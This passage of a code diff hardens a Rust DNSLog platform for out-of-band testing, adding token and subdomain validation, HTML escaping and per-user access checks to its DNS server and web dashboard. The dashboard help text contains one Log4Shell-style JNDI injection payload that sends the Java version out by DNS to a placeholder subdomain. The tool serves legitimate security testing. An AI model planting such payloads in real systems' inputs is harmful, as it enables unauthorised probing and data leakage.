@@ -1,25 +1,28 @@
-use actix_web::{web, App, HttpResponse, HttpServer, Responder, HttpRequest};
+use actix_web::{web, App, HttpRequest, HttpResponse, HttpServer, Responder};
 use async_trait::async_trait;
 use chrono::{FixedOffset, TimeZone};
 use clap::Parser;
-use rand::{distributions::Alphanumeric, Rng};
-use rusqlite::{params, OptionalExtension};
 use r2d2::Pool;
 use r2d2_sqlite::SqliteConnectionManager;
+use rand::{distributions::Alphanumeric, Rng};
+use rusqlite::{params, OptionalExtension};
 use serde::{Deserialize, Serialize};
 use std::collections::HashMap;
 use std::env;
 use std::fs;
+use std::net::Ipv4Addr;
 use std::sync::OnceLock;
 use tokio::net::UdpSocket;
 use tokio::sync::{mpsc, Mutex};
-use std::net::Ipv4Addr;
 use trust_dns_proto::op::{Header, ResponseCode};
-use trust_dns_proto::rr::{Record, RecordType, RData};
+use trust_dns_proto::rr::{RData, Record, RecordType};
 use trust_dns_server::authority::MessageResponseBuilder;
-use trust_dns_server::server::{Request, RequestHandler, ResponseHandler, ResponseInfo, ServerFuture};
+use trust_dns_server::server::{
+    Request, RequestHandler, ResponseHandler, ResponseInfo, ServerFuture,
+};
 
 const MAX_SUBDOMAINS_PER_USER: usize = 10;
+const LOG_RETENTION_SECONDS: i64 = 7 * 24 * 3600;
 
 // ---- Configuration ----
 
@@ -78,27 +81,39 @@ impl AppConfig {
         };
 
         // Merge: CLI args > config file > env vars > defaults
-        let dns_port = cli.dns_port
+        let dns_port = cli
+            .dns_port
             .or(file_cfg.dns_port)
             .or_else(|| env::var("DNS_PORT").ok().and_then(|v| v.parse().ok()))
             .unwrap_or(53);
 
-        let web_port = cli.web_port
+        let web_port = cli
+            .web_port
             .or(file_cfg.web_port)
             .or_else(|| env::var("WEB_PORT").ok().and_then(|v| v.parse().ok()))
             .unwrap_or(8888);
 
-        let domain = cli.domain
+        let domain = cli
+            .domain
             .or(file_cfg.domain)
             .or_else(|| env::var("DOMAIN_SUFFIX").ok())
-            .unwrap_or_else(|| "example.com".to_string());
+            .unwrap_or_else(|| "example.com".to_string())
+            .trim()
+            .trim_end_matches('.')
+            .to_lowercase();
 
-        let dns_response = cli.dns_response
+        let dns_response = cli
+            .dns_response
             .or(file_cfg.dns_response)
             .or_else(|| env::var("DNS_RESPONSE").ok())
             .unwrap_or_else(|| "127.0.0.1".to_string());
 
-        Self { dns_port, web_port, domain, dns_response }
+        Self {
+            dns_port,
+            web_port,
+            domain,
+            dns_response,
+        }
     }
 }
 
@@ -108,6 +123,55 @@ static CONFIG: OnceLock<AppConfig> = OnceLock::new();
 
 fn domain_suffix() -> &'static str {
     &CONFIG.get().unwrap().domain
+}
+
+fn is_valid_token(token: &str) -> bool {
+    token.len() == 16
+        && token
+            .bytes()
+            .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit())
+}
+
+fn token_from_query(query: &HashMap<String, String>) -> Result<String, HttpResponse> {
+    match query.get("token") {
+        Some(token) if is_valid_token(token) => Ok(token.to_string()),
+        Some(_) => {
+            Err(HttpResponse::BadRequest().json(serde_json::json!({"error": "invalid token"})))
+        }
+        None => Err(HttpResponse::BadRequest().json(serde_json::json!({"error": "missing token"}))),
+    }
+}
+
+fn is_valid_subdomain_name(subdomain: &str) -> bool {
+    let suffix = domain_suffix().to_lowercase();
+    let name = subdomain.trim_end_matches('.').to_lowercase();
+    if name.len() > 253 || !(name == suffix || name.ends_with(&format!(".{}", suffix))) {
+        return false;
+    }
+    name.split('.').all(|label| {
+        !label.is_empty()
+            && label.len() <= 63
+            && !label.starts_with('-')
+            && !label.ends_with('-')
+            && label
+                .bytes()
+                .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'-')
+    })
+}
+
+fn escape_html(value: &str) -> String {
+    let mut escaped = String::with_capacity(value.len());
+    for ch in value.chars() {
+        match ch {
+            '&' => escaped.push_str("&amp;"),
+            '<' => escaped.push_str("&lt;"),
+            '>' => escaped.push_str("&gt;"),
+            '"' => escaped.push_str("&quot;"),
+            '\'' => escaped.push_str("&#39;"),
+            _ => escaped.push(ch),
+        }
+    }
+    escaped
 }
 
 // ---- Time helpers ----
@@ -127,10 +191,18 @@ fn format_ts(ts: i64) -> String {
 
 fn relative_time(ts: i64) -> String {
     let diff = now_ts() - ts;
-    if diff < 0 { return "刚刚".to_string(); }
-    if diff < 60 { return format!("{}秒前", diff); }
-    if diff < 3600 { return format!("{}分钟前", diff / 60); }
-    if diff < 86400 { return format!("{}小时前", diff / 3600); }
+    if diff < 0 {
+        return "刚刚".to_string();
+    }
+    if diff < 60 {
+        return format!("{}秒前", diff);
+    }
+    if diff < 3600 {
+        return format!("{}分钟前", diff / 60);
+    }
+    if diff < 86400 {
+        return format!("{}小时前", diff / 3600);
+    }
     format!("{}天前", diff / 86400)
 }
 
@@ -186,16 +258,21 @@ struct IpLookupService {
 
 impl IpLookupService {
     fn new(rx: mpsc::Receiver<String>, pool: Pool<SqliteConnectionManager>) -> Self {
-        Self { cache: Mutex::new(HashMap::new()), rx: Mutex::new(rx), pool }
+        Self {
+            cache: Mutex::new(HashMap::new()),
+            rx: Mutex::new(rx),
+            pool,
+        }
     }
 
     async fn run(self) {
         let client = match reqwest::Client::builder()
             .timeout(std::time::Duration::from_secs(5))
-            .build() {
-                Ok(c) => c,
-                Err(_) => return,
-            };
+            .build()
+        {
+            Ok(c) => c,
+            Err(_) => return,
+        };
 
         loop {
             let ip = {
@@ -206,14 +283,21 @@ impl IpLookupService {
                 }
             };
 
-            if Self::is_private_ip(&ip) { continue; }
+            if Self::is_private_ip(&ip) {
+                continue;
+            }
 
             {
                 let cache = self.cache.lock().await;
-                if cache.contains_key(&ip) { continue; }
+                if cache.contains_key(&ip) {
+                    continue;
+                }
             }
 
-            let url = format!("http://ip-api.com/json/{}?lang=zh-CN&fields=status,country,regionName,city", ip);
+            let url = format!(
+                "http://ip-api.com/json/{}?lang=zh-CN&fields=status,country,regionName,city",
+                ip
+            );
             let region = match client.get(&url).send().await {
                 Ok(resp) => match resp.json::<serde_json::Value>().await {
                     Ok(data) => {
@@ -222,8 +306,14 @@ impl IpLookupService {
                             let r = data["regionName"].as_str().unwrap_or("");
                             let ci = data["city"].as_str().unwrap_or("");
                             let s = format!("{} {} {}", c, r, ci).trim().to_string();
-                            if s.is_empty() { "未知".to_string() } else { s }
-                        } else { "未知".to_string() }
+                            if s.is_empty() {
+                                "未知".to_string()
+                            } else {
+                                s
+                            }
+                        } else {
+                            "未知".to_string()
+                        }
                     }
                     Err(_) => "未知".to_string(),
                 },
@@ -250,12 +340,20 @@ impl IpLookupService {
     }
 
     fn is_private_ip(ip: &str) -> bool {
-        ip.starts_with("127.") || ip.starts_with("10.") || ip.starts_with("192.168.")
+        ip.starts_with("127.")
+            || ip.starts_with("10.")
+            || ip.starts_with("192.168.")
             || (ip.starts_with("172.") && {
                 let parts: Vec<&str> = ip.split('.').collect();
-                parts.get(1).and_then(|s| s.parse::<u8>().ok()).map_or(false, |b| b >= 16 && b <= 31)
+                parts
+                    .get(1)
+                    .and_then(|s| s.parse::<u8>().ok())
+                    .map_or(false, |b| b >= 16 && b <= 31)
             })
-            || ip == "::1" || ip.starts_with("fe80:") || ip.starts_with("fc") || ip.starts_with("fd")
+            || ip == "::1"
+            || ip.starts_with("fe80:")
+            || ip.starts_with("fc")
+            || ip.starts_with("fd")
     }
 }
 
@@ -269,17 +367,27 @@ struct MyDnsHandler {
 
 fn record_type_string(rt: RecordType) -> &'static str {
     match rt {
-        RecordType::A => "A", RecordType::AAAA => "AAAA", RecordType::CNAME => "CNAME",
-        RecordType::MX => "MX", RecordType::TXT => "TXT", RecordType::NS => "NS",
-        RecordType::SOA => "SOA", RecordType::PTR => "PTR", RecordType::SRV => "SRV",
-        RecordType::CAA => "CAA", RecordType::ANY => "ANY", _ => "OTHER",
+        RecordType::A => "A",
+        RecordType::AAAA => "AAAA",
+        RecordType::CNAME => "CNAME",
+        RecordType::MX => "MX",
+        RecordType::TXT => "TXT",
+        RecordType::NS => "NS",
+        RecordType::SOA => "SOA",
+        RecordType::PTR => "PTR",
+        RecordType::SRV => "SRV",
+        RecordType::CAA => "CAA",
+        RecordType::ANY => "ANY",
+        _ => "OTHER",
     }
 }
 
 #[async_trait]
 impl RequestHandler for MyDnsHandler {
     async fn handle_request<R: ResponseHandler>(
-        &self, request: &Request, mut response_handle: R,
+        &self,
+        request: &Request,
+        mut response_handle: R,
     ) -> ResponseInfo {
         let query = request.query();
         let query_name = query.name().to_string();
@@ -293,8 +401,8 @@ impl RequestHandler for MyDnsHandler {
         let resp_ip = self.response_ip;
         let query_type = query.query_type();
 
-        let matched = tokio::task::spawn_blocking(move || {
-            let conn = pool.get().expect("Failed to get DB connection");
+        let matched = tokio::task::spawn_blocking(move || -> Result<bool, String> {
+            let conn = pool.get().map_err(|e| e.to_string())?;
             let result: Option<(String, String)> = conn
                 .query_row(
                     "SELECT user_token, subdomain FROM subdomains WHERE ?1 = subdomain OR ?1 LIKE '%.' || subdomain",
@@ -302,7 +410,7 @@ impl RequestHandler for MyDnsHandler {
                     |row| Ok((row.get(0)?, row.get(1)?)),
                 )
                 .optional()
-                .expect("DB query failed");
+                .map_err(|e| e.to_string())?;
             if let Some((_token, registered_sub)) = result {
                 // Only log A and ANY queries to avoid flooding from resolver AAAA/CNAME/etc. retries
                 if query_type == RecordType::A || query_type == RecordType::ANY {
@@ -311,14 +419,21 @@ impl RequestHandler for MyDnsHandler {
                         "INSERT INTO logs (registered_subdomain, requested_domain, client_ip, timestamp, record_type) VALUES (?1, ?2, ?3, ?4, ?5)",
                         params![registered_sub, normalized_query, client_ip, timestamp, rt],
                     );
+                    let _ = conn.execute(
+                        "DELETE FROM logs WHERE timestamp < ?1",
+                        params![timestamp - LOG_RETENTION_SECONDS],
+                    );
                     let _ = ip_tx.try_send(ip_for_lookup);
                 }
-                true
+                Ok(true)
             } else {
                 println!("DNS [{}] {} (未注册) 来源 {}", rt, normalized_query, client_ip);
-                false
+                Ok(false)
             }
-        }).await.expect("spawn_blocking failed");
+        }).await
+            .map_err(|e| e.to_string())
+            .and_then(|inner| inner)
+            .unwrap_or(false);
 
         let info = if matched {
             if query.query_type() == RecordType::A || query.query_type() == RecordType::ANY {
@@ -334,9 +449,17 @@ impl RequestHandler for MyDnsHandler {
                 record.set_ttl(60);
                 record.set_data(Some(RData::A(resp_ip)));
                 let answers = vec![record];
-                let response = MessageResponseBuilder::from_message_request(request)
-                    .build(header, answers.iter(), vec![], vec![], vec![]);
-                response_handle.send_response(response).await.expect("failed to send response")
+                let response = MessageResponseBuilder::from_message_request(request).build(
+                    header,
+                    answers.iter(),
+                    vec![],
+                    vec![],
+                    vec![],
+                );
+                response_handle
+                    .send_response(response)
+                    .await
+                    .expect("failed to send response")
             } else {
                 // Domain exists but no record for this type - return NOERROR with empty answer
                 // This prevents resolver retries (NXDOMAIN would trigger re-queries)
@@ -345,35 +468,76 @@ impl RequestHandler for MyDnsHandler {
                 header.set_authoritative(true);
                 header.set_recursion_available(true);
                 let empty: Vec<Record> = vec![];
-                let response = MessageResponseBuilder::from_message_request(request)
-                    .build(header, empty.iter(), vec![], vec![], vec![]);
-                response_handle.send_response(response).await.expect("failed to send response")
+                let response = MessageResponseBuilder::from_message_request(request).build(
+                    header,
+                    empty.iter(),
+                    vec![],
+                    vec![],
+                    vec![],
+                );
+                response_handle
+                    .send_response(response)
+                    .await
+                    .expect("failed to send response")
             }
         } else {
             // Unmatched domain - NXDOMAIN
             let response = MessageResponseBuilder::from_message_request(request)
                 .error_msg(request.header(), ResponseCode::NXDomain);
-            response_handle.send_response(response).await.expect("failed to send response")
+            response_handle
+                .send_response(response)
+                .await
+                .expect("failed to send response")
         };
         info
     }
 }
 
 fn random_string(len: usize) -> String {
-    rand::thread_rng().sample_iter(&Alphanumeric).take(len).map(char::from).collect::<String>().to_lowercase()
+    rand::thread_rng()
+        .sample_iter(&Alphanumeric)
+        .take(len)
+        .map(char::from)
+        .collect::<String>()
+        .to_lowercase()
 }
 
-async fn auto_register(pool: &Pool<SqliteConnectionManager>, access_ip: String) -> String {
-    let token = random_string(16);
-    let default_sub = format!("{}.{}", random_string(8), domain_suffix());
-    let pool_clone = pool.clone();
-    let tk = token.clone();
-    tokio::task::spawn_blocking(move || {
-        let conn = pool_clone.get().expect("Failed to get DB connection");
-        conn.execute("INSERT INTO users (token, access_ip) VALUES (?1, ?2)", params![tk.clone(), access_ip]).expect("Failed to insert user");
-        conn.execute("INSERT INTO subdomains (user_token, subdomain) VALUES (?1, ?2)", params![tk, default_sub]).expect("Failed to insert subdomain");
-    }).await.expect("spawn_blocking failed");
-    token
+async fn auto_register(
+    pool: &Pool<SqliteConnectionManager>,
+    access_ip: String,
+) -> Result<String, String> {
+    for _ in 0..5 {
+        let token = random_string(16);
+        let default_sub = format!("{}.{}", random_string(8), domain_suffix());
+        let pool_clone = pool.clone();
+        let tk = token.clone();
+        let ip = access_ip.clone();
+        let res: Result<(), String> = tokio::task::spawn_blocking(move || {
+            let mut conn = pool_clone.get().map_err(|e| e.to_string())?;
+            let tx = conn.transaction().map_err(|e| e.to_string())?;
+            tx.execute(
+                "INSERT INTO users (token, access_ip) VALUES (?1, ?2)",
+                params![tk.clone(), ip],
+            )
+            .map_err(|e| e.to_string())?;
+            tx.execute(
+                "INSERT INTO subdomains (user_token, subdomain) VALUES (?1, ?2)",
+                params![tk, default_sub],
+            )
+            .map_err(|e| e.to_string())?;
+            tx.commit().map_err(|e| e.to_string())?;
+            Ok(())
+        })
+        .await
+        .map_err(|e| e.to_string())
+        .and_then(|inner| inner);
+
+        if res.is_ok() {
+            return Ok(token);
+        }
+    }
+
+    Err("failed to register user".to_string())
 }
 
 // ---- API Handlers ----
@@ -382,19 +546,28 @@ async fn subdomains_api(
     pool: web::Data<Pool<SqliteConnectionManager>>,
     query: web::Query<HashMap<String, String>>,
 ) -> impl Responder {
-    let token = match query.get("token") {
-        Some(t) => t.to_string(),
-        None => return HttpResponse::BadRequest().json(serde_json::json!({"error": "缺少 token 参数"})),
+    let token = match token_from_query(&query) {
+        Ok(token) => token,
+        Err(resp) => return resp,
     };
     let pool_clone = pool.get_ref().clone();
     let res = tokio::task::spawn_blocking(move || {
         let conn = pool_clone.get().map_err(|e| e.to_string())?;
-        let mut stmt = conn.prepare("SELECT subdomain FROM subdomains WHERE user_token = ?1").map_err(|e| e.to_string())?;
-        let iter = stmt.query_map(params![token], |row| row.get::<_, String>(0)).map_err(|e| e.to_string())?;
+        let mut stmt = conn
+            .prepare("SELECT subdomain FROM subdomains WHERE user_token = ?1")
+            .map_err(|e| e.to_string())?;
+        let iter = stmt
+            .query_map(params![token], |row| row.get::<_, String>(0))
+            .map_err(|e| e.to_string())?;
         let mut subs = Vec::new();
-        for s in iter { subs.push(s.map_err(|e| e.to_string())?); }
+        for s in iter {
+            subs.push(s.map_err(|e| e.to_string())?);
+        }
         Ok(subs)
-    }).await.map_err(|e| e.to_string()).and_then(|inner| inner);
+    })
+    .await
+    .map_err(|e| e.to_string())
+    .and_then(|inner| inner);
 
     match res {
         Ok(subdomains) => HttpResponse::Ok().json(SubdomainsResponse { subdomains }),
@@ -406,31 +579,67 @@ async fn newsub_api(
     pool: web::Data<Pool<SqliteConnectionManager>>,
     query: web::Query<HashMap<String, String>>,
 ) -> impl Responder {
-    let token = match query.get("token") {
-        Some(t) => t.to_string(),
-        None => return HttpResponse::BadRequest().json(serde_json::json!({"error": "缺少 token 参数"})),
+    let token = match token_from_query(&query) {
+        Ok(token) => token,
+        Err(resp) => return resp,
     };
     let pool_clone = pool.get_ref().clone();
     let res = tokio::task::spawn_blocking({
         let tk = token.clone();
         move || {
-            let conn = pool_clone.get().expect("Failed to get DB connection");
-            let exists: Option<String> = conn.query_row("SELECT token FROM users WHERE token = ?1", params![tk.clone()], |row| row.get(0)).optional().expect("query failed");
-            if exists.is_none() { return Err("用户不存在".to_string()); }
-            let count: i64 = conn.query_row("SELECT COUNT(*) FROM subdomains WHERE user_token = ?1", params![tk.clone()], |row| row.get(0)).expect("count failed");
-            if count >= MAX_SUBDOMAINS_PER_USER as i64 { return Err(format!("子域名数量已达上限 ({})", MAX_SUBDOMAINS_PER_USER)); }
+            let mut conn = pool_clone.get().map_err(|e| e.to_string())?;
+            let tx = conn.transaction().map_err(|e| e.to_string())?;
+            let exists: Option<String> = tx
+                .query_row(
+                    "SELECT token FROM users WHERE token = ?1",
+                    params![tk.clone()],
+                    |row| row.get(0),
+                )
+                .optional()
+                .map_err(|e| e.to_string())?;
+            if exists.is_none() {
+                return Err("用户不存在".to_string());
+            }
+            let count: i64 = tx
+                .query_row(
+                    "SELECT COUNT(*) FROM subdomains WHERE user_token = ?1",
+                    params![tk.clone()],
+                    |row| row.get(0),
+                )
+                .map_err(|e| e.to_string())?;
+            if count >= MAX_SUBDOMAINS_PER_USER as i64 {
+                return Err(format!("子域名数量已达上限 ({})", MAX_SUBDOMAINS_PER_USER));
+            }
             let new_sub = format!("{}.{}", random_string(8), domain_suffix());
-            conn.execute("INSERT INTO subdomains (user_token, subdomain) VALUES (?1, ?2)", params![tk.clone(), new_sub.clone()]).expect("insert failed");
-            let mut stmt = conn.prepare("SELECT subdomain FROM subdomains WHERE user_token = ?1").expect("prepare failed");
-            let iter = stmt.query_map(params![tk], |row| row.get::<_, String>(0)).expect("query failed");
+            tx.execute(
+                "INSERT INTO subdomains (user_token, subdomain) VALUES (?1, ?2)",
+                params![tk.clone(), new_sub.clone()],
+            )
+            .map_err(|e| e.to_string())?;
+            let mut stmt = tx
+                .prepare("SELECT subdomain FROM subdomains WHERE user_token = ?1")
+                .map_err(|e| e.to_string())?;
+            let iter = stmt
+                .query_map(params![tk], |row| row.get::<_, String>(0))
+                .map_err(|e| e.to_string())?;
             let mut subs = Vec::new();
-            for s in iter { subs.push(s.expect("get failed")); }
+            for s in iter {
+                subs.push(s.map_err(|e| e.to_string())?);
+            }
+            drop(stmt);
+            tx.commit().map_err(|e| e.to_string())?;
             Ok((new_sub, subs))
         }
-    }).await.map_err(|e| e.to_string()).and_then(|inner| inner);
+    })
+    .await
+    .map_err(|e| e.to_string())
+    .and_then(|inner| inner);
 
     match res {
-        Ok((new_sub, subdomains)) => HttpResponse::Ok().json(NewSubResponse { new_sub, subdomains }),
+        Ok((new_sub, subdomains)) => HttpResponse::Ok().json(NewSubResponse {
+            new_sub,
+            subdomains,
+        }),
         Err(e) => HttpResponse::BadRequest().json(serde_json::json!({"error": e})),
     }
 }
@@ -439,34 +648,55 @@ async fn delete_sub_api(
     pool: web::Data<Pool<SqliteConnectionManager>>,
     query: web::Query<HashMap<String, String>>,
 ) -> impl Responder {
-    let token = match query.get("token") {
-        Some(t) => t.to_string(),
-        None => return HttpResponse::BadRequest().json(serde_json::json!({"error": "缺少 token 参数"})),
+    let token = match token_from_query(&query) {
+        Ok(token) => token,
+        Err(resp) => return resp,
     };
     let subdomain = match query.get("subdomain") {
-        Some(s) => s.to_lowercase(),
-        None => return HttpResponse::BadRequest().json(serde_json::json!({"error": "缺少 subdomain 参数"})),
+        Some(s) if is_valid_subdomain_name(s) => s.to_lowercase(),
+        Some(_) => {
+            return HttpResponse::BadRequest()
+                .json(serde_json::json!({"error": "invalid subdomain"}))
+        }
+        None => {
+            return HttpResponse::BadRequest()
+                .json(serde_json::json!({"error": "缺少 subdomain 参数"}))
+        }
     };
     let pool_clone = pool.get_ref().clone();
     let res = tokio::task::spawn_blocking(move || {
         let conn = pool_clone.get().map_err(|e| e.to_string())?;
         // Verify ownership
-        let owner: Option<String> = conn.query_row(
-            "SELECT user_token FROM subdomains WHERE subdomain = ?1",
-            params![subdomain],
-            |row| row.get(0),
-        ).optional().map_err(|e| e.to_string())?;
+        let owner: Option<String> = conn
+            .query_row(
+                "SELECT user_token FROM subdomains WHERE subdomain = ?1",
+                params![subdomain],
+                |row| row.get(0),
+            )
+            .optional()
+            .map_err(|e| e.to_string())?;
         match owner {
             Some(owner_token) if owner_token == token => {
                 // Delete logs first, then subdomain
-                conn.execute("DELETE FROM logs WHERE registered_subdomain = ?1", params![subdomain]).map_err(|e| e.to_string())?;
-                conn.execute("DELETE FROM subdomains WHERE subdomain = ?1", params![subdomain]).map_err(|e| e.to_string())?;
+                conn.execute(
+                    "DELETE FROM logs WHERE registered_subdomain = ?1",
+                    params![subdomain],
+                )
+                .map_err(|e| e.to_string())?;
+                conn.execute(
+                    "DELETE FROM subdomains WHERE subdomain = ?1",
+                    params![subdomain],
+                )
+                .map_err(|e| e.to_string())?;
                 Ok(())
             }
             Some(_) => Err("无权删除该子域名".to_string()),
             None => Err("子域名不存在".to_string()),
         }
-    }).await.map_err(|e| e.to_string()).and_then(|inner| inner);
+    })
+    .await
+    .map_err(|e| e.to_string())
+    .and_then(|inner| inner);
 
     match res {
         Ok(()) => HttpResponse::Ok().json(serde_json::json!({"success": true})),
@@ -478,9 +708,9 @@ async fn get_logs_json(
     pool: web::Data<Pool<SqliteConnectionManager>>,
     query: web::Query<HashMap<String, String>>,
 ) -> impl Responder {
-    let token = match query.get("token") {
-        Some(t) => t.to_string(),
-        None => return HttpResponse::BadRequest().json(serde_json::json!({"error": "缺少 token 参数"})),
+    let token = match token_from_query(&query) {
+        Ok(token) => token,
+        Err(resp) => return resp,
     };
     let pool_clone = pool.get_ref().clone();
     let res = tokio::task::spawn_blocking(move || {
@@ -526,9 +756,9 @@ async fn clear_logs_api(
     pool: web::Data<Pool<SqliteConnectionManager>>,
     query: web::Query<HashMap<String, String>>,
 ) -> impl Responder {
-    let token = match query.get("token") {
-        Some(t) => t.to_string(),
-        None => return HttpResponse::BadRequest().json(serde_json::json!({"error": "缺少 token 参数"})),
+    let token = match token_from_query(&query) {
+        Ok(token) => token,
+        Err(resp) => return resp,
     };
     let pool_clone = pool.get_ref().clone();
     let res = tokio::task::spawn_blocking(move || {
@@ -551,13 +781,28 @@ async fn callback_api(
     path: web::Path<String>,
     query: web::Query<HashMap<String, String>>,
 ) -> impl Responder {
+    let token = match token_from_query(&query) {
+        Ok(token) => token,
+        Err(resp) => return resp,
+    };
     let subdomain = path.into_inner().to_lowercase();
-    let limit: i64 = query.get("limit").and_then(|l| l.parse().ok()).unwrap_or(10).min(100);
+    if !is_valid_subdomain_name(&subdomain) {
+        return HttpResponse::BadRequest().json(serde_json::json!({"error": "invalid subdomain"}));
+    }
+    let limit: i64 = query
+        .get("limit")
+        .and_then(|l| l.parse().ok())
+        .unwrap_or(10)
+        .clamp(1, 100);
     let pool_clone = pool.get_ref().clone();
     let res = tokio::task::spawn_blocking(move || {
         let conn = pool_clone.get().map_err(|e| e.to_string())?;
-        let exists: Option<String> = conn.query_row("SELECT subdomain FROM subdomains WHERE subdomain = ?1", params![subdomain], |row| row.get(0)).optional().map_err(|e| e.to_string())?;
-        let sub = match exists { Some(s) => s, None => return Err("子域名不存在".to_string()) };
+        let exists: Option<String> = conn.query_row(
+            "SELECT subdomain FROM subdomains WHERE subdomain = ?1 AND user_token = ?2",
+            params![subdomain, token],
+            |row| row.get(0),
+        ).optional().map_err(|e| e.to_string())?;
+        let sub = match exists { Some(s) => s, None => return Err("subdomain not found".to_string()) };
         let mut stmt = conn.prepare(
             "SELECT requested_domain, client_ip, timestamp, record_type, COALESCE(ip_region, '') FROM logs WHERE registered_subdomain = ?1 ORDER BY id DESC LIMIT ?2"
         ).map_err(|e| e.to_string())?;
@@ -593,20 +838,36 @@ async fn dashboard(
     pool: web::Data<Pool<SqliteConnectionManager>>,
     query: web::Query<HashMap<String, String>>,
 ) -> impl Responder {
-    let access_ip = req.connection_info().realip_remote_addr().unwrap_or("unknown").to_string();
+    let access_ip = req
+        .connection_info()
+        .realip_remote_addr()
+        .unwrap_or("unknown")
+        .to_string();
 
     // If no token in URL, auto-register and REDIRECT to URL with token
     let token = match query.get("token") {
-        Some(t) => t.to_string(),
+        Some(t) if is_valid_token(t) => t.to_string(),
+        Some(_) => {
+            return HttpResponse::BadRequest().json(serde_json::json!({"error": "invalid token"}))
+        }
         None => {
-            let new_token = auto_register(&pool, access_ip).await;
+            let new_token = match auto_register(&pool, access_ip).await {
+                Ok(token) => token,
+                Err(e) => {
+                    return HttpResponse::InternalServerError()
+                        .json(serde_json::json!({"error": e}))
+                }
+            };
             return HttpResponse::Found()
                 .append_header(("Location", format!("/?token={}", new_token)))
                 .finish();
         }
     };
+    let token_html = escape_html(&token);
+    let token_js = serde_json::to_string(&token).unwrap_or_else(|_| "\"\"".to_string());
 
-    let html = format!(r##"<!DOCTYPE html>
+    let html = format!(
+        r##"<!DOCTYPE html>
 <html lang="zh-CN">
 <head>
 <meta charset="UTF-8">
@@ -718,7 +979,7 @@ body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Noto Sans',
         <div class="header-meta">
             <div class="token-display" id="tokenDisplay" title="点击复制令牌">
                 <span class="token-label">令牌</span>
-                <span id="tokenValue">{token}</span>
+                <span id="tokenValue">{token_html}</span>
                 <span class="copy-icon">&#x2398;</span>
             </div>
         </div>
@@ -749,7 +1010,7 @@ body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Noto Sans',
             <strong>带外测试（OOB）：</strong>将数据嵌入子域名部分，通过 DNS 查询实现信息外传。<br>
             示例: <code>${{jndi:ldap://test.${{java:version}}.your-subdomain}}</code><br><br>
             <strong>回调接口：</strong>通过 API 程序化验证交互记录：<br>
-            <code>GET /api/callback/your-subdomain?limit=10</code><br><br>
+            <code>GET /api/callback/your-subdomain?token=your-token&amp;limit=10</code><br><br>
             <strong>注意：</strong>对方使用的 DNS 服务器可能存在缓存或负载均衡，导致同一次触发产生多条 DNS 记录。
         </div></div>
     </div>
@@ -757,9 +1018,17 @@ body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Noto Sans',
 <div class="footer">&copy; 2026 Pepster &mdash; DNSLog 平台 &mdash; 基于 Rust + Actix 构建</div>
 <div id="toastContainer" class="toast-container"></div>
 <script>
-var TOKEN = '{token}';
+var TOKEN = {token_js};
 var knownLogIds = {{}};
 
+function escapeHtml(value) {{
+    var map = {{'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}};
+    return String(value == null ? '' : value).replace(/[&<>"']/g, function(ch) {{ return map[ch]; }});
+}}
+function cleanRecordType(rt) {{
+    var text = String(rt || 'A').toUpperCase();
+    return /^(A|AAAA|CNAME|MX|TXT|NS|SOA|PTR|SRV|CAA|ANY|OTHER)$/.test(text) ? text : 'OTHER';
+}}
 function showToast(msg, type) {{
     type = type || 'info';
     var c = document.getElementById('toastContainer');
@@ -808,10 +1077,13 @@ function relativeTime(tsStr) {{
     if (diff < 86400) return Math.floor(diff / 3600) + '小时前';
     return Math.floor(diff / 86400) + '天前';
 }}
-function recordTypeBadge(rt) {{ return '<span class="record-type type-' + (rt||'a').toLowerCase() + '">' + (rt||'A') + '</span>'; }}
+function recordTypeBadge(rt) {{
+    var text = cleanRecordType(rt);
+    return '<span class="record-type type-' + text.toLowerCase() + '">' + escapeHtml(text) + '</span>';
+}}
 
 function fetchSubdomains() {{
-    fetch('/api/subdomains?token=' + TOKEN).then(function(r) {{ if (!r.ok) throw new Error(); return r.json(); }})
+    fetch('/api/subdomains?token=' + encodeURIComponent(TOKEN)).then(function(r) {{ if (!r.ok) throw new Error(); return r.json(); }})
     .then(function(data) {{
         var list = document.getElementById('subdomainsList');
         var subs = data.subdomains || [];
@@ -819,10 +1091,12 @@ function fetchSubdomains() {{
         if (subs.length === 0) {{ list.innerHTML = '<div class="empty-state"><div class="empty-icon">&#x1F310;</div><div class="empty-text">暂无子域名</div><div class="empty-hint">点击「申请新子域名」创建</div></div>'; return; }}
         var h = '';
         subs.forEach(function(s) {{
-            h += '<div class="subdomain-item"><span class="subdomain-name" title="点击复制">' + s + '</span><div class="subdomain-actions">' +
-                '<button class="btn btn-sm" data-copy="' + s + '" data-label="子域名已复制">&#x2398; 复制</button>' +
-                '<button class="btn btn-sm" data-copy="http://' + window.location.host + '/api/callback/' + s + '?limit=10" data-label="回调地址已复制">&#x26A1; 回调</button>' +
-                '<button class="btn btn-sm btn-danger" data-delete="' + s + '" title="删除此子域名及其所有日志">&#x1F5D1; 删除</button>' +
+            var safeSub = escapeHtml(s);
+            var callbackUrl = 'http://' + window.location.host + '/api/callback/' + encodeURIComponent(s) + '?token=' + encodeURIComponent(TOKEN) + '&limit=10';
+            h += '<div class="subdomain-item"><span class="subdomain-name" title="点击复制">' + safeSub + '</span><div class="subdomain-actions">' +
+                '<button class="btn btn-sm" data-copy="' + safeSub + '" data-label="子域名已复制">&#x2398; 复制</button>' +
+                '<button class="btn btn-sm" data-copy="' + escapeHtml(callbackUrl) + '" data-label="回调地址已复制">&#x26A1; 回调</button>' +
+                '<button class="btn btn-sm btn-danger" data-delete="' + safeSub + '" title="删除此子域名及其所有日志">&#x1F5D1; 删除</button>' +
                 '</div></div>';
         }});
         list.innerHTML = h;
@@ -830,19 +1104,19 @@ function fetchSubdomains() {{
 }}
 
 function fetchLogs() {{
-    fetch('/api/logs?token=' + TOKEN).then(function(r) {{ if (!r.ok) throw new Error(); return r.json(); }})
+    fetch('/api/logs?token=' + encodeURIComponent(TOKEN)).then(function(r) {{ if (!r.ok) throw new Error(); return r.json(); }})
     .then(function(data) {{
         setConnectionStatus(true);
         var total = 0, h = '';
         data.forEach(function(item) {{
             total += item.log_count;
-            h += '<div class="log-section"><div class="log-section-header"><span class="log-section-title">' + item.subdomain + '</span><span class="badge ' + (item.log_count>0?'':'badge-muted') + '">' + item.log_count + '</span></div>';
